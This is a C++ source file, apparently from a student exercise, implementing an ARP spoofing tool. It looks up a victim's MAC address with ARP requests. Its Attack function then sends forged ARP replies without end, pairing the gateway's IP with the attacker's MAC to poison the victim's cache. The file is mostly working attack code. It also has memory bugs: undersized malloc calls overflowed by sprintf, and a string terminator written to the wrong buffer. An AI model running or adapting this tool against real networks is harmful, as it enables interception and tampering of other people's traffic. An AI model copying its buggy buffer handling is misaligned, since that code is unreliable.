#include "stdafx.h"
#include "Processing.h"

// ########## Define a function to elimate special character ##########
void delChar(char* buf, char* dest, char ch){
	int cnt = 0;
	for(int i = 0; buf[i] != 0; i++){
		if(buf[i] != ch){
			dest[cnt] = buf[i];
			cnt++;
		}
	}
	buf[cnt] = 0;
}

// ########## Define a function to insert zero ##########
void convert_mac(const char* data, char* cvrt_str, int s){
	char buf[128] = {0x00, };
	char t_buf[8];
	char* stp = strtok((char*)data, ":");
	int temp = 0;
	do{
		memset(t_buf, 0x0, sizeof(t_buf));
		sscanf(stp, "%x", &temp);
		snprintf(t_buf, sizeof(t_buf)-1, "%02x", temp);
		strncat(buf, t_buf, sizeof(buf)-1);
		strncat(buf, ":", sizeof(buf)-1);
	}
	while((stp = strtok(NULL, ":")) != NULL);
	buf[strlen(buf)-1] = '\0';
	strncpy(cvrt_str, buf, s);
}

// ########## Sending contaminated ARP packets ##########
// sip : gateway's ip
// smac : attacker's mac
// tip : victim's ip
// tmac : victim's mac
void* Attack(void* info){
	struct Parameter_Pthread* PP = (struct Parameter_Pthread*)(info);
	struct in_addr src_in_addr, target_in_addr;
	struct ARP_header* attack_packet = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
	
	attack_packet->frame_type = htons(ARP_FRAME_TYPE);
	attack_packet->mac_type = htons(ETHER_MAC_TYPE);
	attack_packet->prot_type = htons(IP_PROTO_TYPE);
	attack_packet->mac_addr_size = ETH_MAC_ADDR_LEN;
	attack_packet->prot_addr_size = IP_ADDR_LEN;
	attack_packet->op = htons(OP_ARP_REPLY);

	tomar_ip_addr(&src_in_addr, PP->sip);
	tomar_ip_addr(&target_in_addr, PP->tip);

	tomar_mac_addr(attack_packet->Destination_mac_addr, PP->tmac);
	tomar_mac_addr(attack_packet->target_mac_addr, PP->tmac);
	tomar_mac_addr(attack_packet->src_mac_addr, PP->smac);
	tomar_mac_addr(attack_packet->sender_mac_addr, PP->smac);

	memcpy(attack_packet->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
	memcpy(attack_packet->target_ip_addr, &target_in_addr, IP_ADDR_LEN);

	bzero(attack_packet->padding, 18);

	// 2 attack per 2.5 seconds
	while(1){
		for(int i = 0; i < 2; i++){
			printf("\n----------_ARP_----------\n");
			//Print_ARP(&attack_packet);
			if(pcap_sendpacket(PP->handle, reinterpret_cast<u_char*>(attack_packet), 43) != 0){
				perror("send packet error");
				exit(1);
			}
		}
		sleep(2.5);
	}
}

void* find_My_Mac(void* info){
	char* temp_a_ip_addr = (char*)(info);
	int sockfd, req_cnt = REQ_CNT;
	char s_mac_addr[128] = {0x00, };
	char* s_ip_addr = (char*)malloc(128);

	struct sockaddr_in* sock;
	struct ifconf ifcnf_s;
	struct ifreq* ifr_s;

	sockfd = socket(PF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0){
		perror("socket error");
		return NULL;
	}

	memset((void*)&ifcnf_s, 0x0, sizeof(ifcnf_s));
	ifcnf_s.ifc_len = sizeof(struct ifreq) * req_cnt;
	ifcnf_s.ifc_buf = (char*)malloc(ifcnf_s.ifc_len);
	if(ioctl(sockfd, SIOCGIFCONF, (char*)&ifcnf_s) < 0){
		perror("icoctl - SIOCGIFCONF error");
		return NULL;
	}

	if(ifcnf_s.ifc_len > (sizeof(struct ifreq) * req_cnt)){
		req_cnt = ifcnf_s.ifc_len;
		ifcnf_s.ifc_buf = (char*)realloc(ifcnf_s.ifc_buf, req_cnt);
	}

	ifr_s = ifcnf_s.ifc_req;
	for(int cnt = 0; cnt < ifcnf_s.ifc_len; cnt += sizeof(struct ifreq), ifr_s++){
		if(ioctl(sockfd, SIOCGIFFLAGS, ifr_s) < 0){
			perror("ioctl - SIOCGFFLAGS error");
			return NULL;
		}

		if(ifr_s->ifr_flags & IFF_LOOPBACK) continue;
		sock = (struct sockaddr_in*)&ifr_s->ifr_addr;
		//sprintf(s_ip_addr, "%s", inet_ntoa(sock->sin_addr));
		if(ioctl(sockfd, SIOCGIFHWADDR, ifr_s) < 0){
			perror("ioctl - SIOCGFHWADDR error");
			return NULL;
		}
		convert_mac(ether_ntoa((struct ether_addr*)(ifr_s->ifr_hwaddr.sa_data)), s_mac_addr, sizeof(s_mac_addr)-1);
	}

	delChar((char*)s_mac_addr, temp_a_ip_addr, ':'); //s_mac_addr
	return (void*)(s_ip_addr);
}

void* find_Mac(void* info){
	// @@@@@@@@@@@@@@@ Make Packet @@@@@@@@@@@@@@@
	struct Parameter_Pthread* PP = (struct Parameter_Pthread*)(info);	
	struct ARP_header* ah = (struct ARP_header*)malloc(sizeof(struct ARP_header));
	struct in_addr src_in_addr, target_in_addr;
	char* sender_mac = (char*)malloc(sizeof(char) * 50);
	if(sender_mac == NULL){ perror("sender_mac malloc error"); exit(1); }

	printf("[ Starting to find %s mac address ]\n", PP->tip);

	ah->frame_type = htons(ARP_FRAME_TYPE);
	ah->mac_type = htons(ETHER_MAC_TYPE);
	ah->prot_type = htons(IP_PROTO_TYPE);
	ah->mac_addr_size = ETH_MAC_ADDR_LEN;
	ah->prot_addr_size = IP_ADDR_LEN;
	ah->op = htons(OP_ARP_REQUEST);

	tomar_ip_addr(&src_in_addr, PP->sip);
	tomar_ip_addr(&target_in_addr, PP->tip);

	tomar_mac_addr(ah->Destination_mac_addr, "ffffffffffff");
	tomar_mac_addr(ah->target_mac_addr, "000000000000");
	tomar_mac_addr(ah->src_mac_addr, PP->smac);
	tomar_mac_addr(ah->sender_mac_addr, PP->smac);

	memcpy(ah->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
	memcpy(ah->target_ip_addr, &target_in_addr, IP_ADDR_LEN);

	bzero(ah->padding, 18);
	struct ARP_header* temp;
	// @@@@@@@@@@@@@@@ Send Request & Recieve Reply @@@@@@@@@@@@@@@
	int count = 0;
	while(1){
		printf("****************\n");
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(PP->handle, &header, &packet);
		temp = (struct ARP_header*)(packet);
		//check_ARP(packet);

		printf("[ send packet %d ]\n", count);
		if(pcap_sendpacket(PP->handle, reinterpret_cast<u_char*>(ah), 42) != 0){
			perror("send packet error");
			exit(1);
		}
		printf("temp->frame_type : %04x\n", temp->frame_type);
		char* c = (char*)malloc(sizeof(4));
		if(c == NULL){ perror("c malloc error"); exit(1); }
		sprintf(c, "%02x", temp->op);
		printf("temp->op : %s\n", c);
		if(strcmp(c, "100") == 0)
			printf("Request\n");
		else if(strcmp(c, "200") == 0) printf("Reply\n");
		else printf("Unknown\n");
		char* a = (char*)malloc(sizeof(32));
		if(a == NULL){ perror("a malloc error"); exit(1); }
		sprintf(a, "%d.%d.%d.%d", temp->sender_ip_addr[0], 
temp->sender_ip_addr[1], temp->sender_ip_addr[2], temp->sender_ip_addr[3]);
		char* b = (char*)malloc(sizeof(32));
		if(b == NULL){ perror("b malloc error"); exit(1); }
		sprintf(b, "%d.%d.%d.%d", ah->target_ip_addr[0], 
ah->target_ip_addr[1], ah->target_ip_addr[2], ah->target_ip_addr[3]);
		printf("temp->sender_mac_addr : %s\n", a);
		printf("ah->target_ip_addr : %s\n", b);

		if((temp->frame_type == htons(ARP_FRAME_TYPE)) && (temp->op == htons(OP_ARP_REPLY)) && (memcmp(temp->sender_ip_addr, ah->target_ip_addr, sizeof(temp->sender_ip_addr)) == 0)){
			printf("[ Success to access %d ]\n", count);
			break;
		}
		count++;
		sleep(1);
	}

	sprintf(sender_mac, "%02x%02x%02x%02x%02x%02x", temp->sender_mac_addr[0], 
temp->sender_mac_addr[1], temp->sender_mac_addr[2], temp->sender_mac_addr[3], temp->sender_mac_addr[4], temp->sender_mac_addr[5]);
	return (void*)(sender_mac);
}

void Print_Data(const u_char* Packet_DATA){
 	for(int i = 0; i < 10; i++) printf("%02x ", Packet_DATA[i]);
	printf("\n");
}

void usage() {
	printf("syntax: ARP_TEST <interface>\n");
	printf("sample: ARP_TEST %s\n", DEFAULT_DEVICE);
}

